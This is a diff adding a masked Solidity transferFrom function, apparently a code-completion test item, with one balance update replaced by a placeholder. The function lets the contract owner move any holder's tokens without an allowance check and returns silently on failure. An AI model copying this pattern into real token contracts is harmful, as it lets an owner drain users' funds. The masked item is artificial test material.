@@ -1,0 +1,1 @@
+"function transferFrom(address _from, address _to, uint256 _value) public {        if(!isOwner()) return;        if (balances[_from] < _value) return;            if (safeAdd(balances[_to] , _value) < balances[_to]) return;        balances[_from] = <mask0>;        balances[_to] = safeAdd(balances[_to],_value);        emit Transfer(_from, _to, _value);    }"
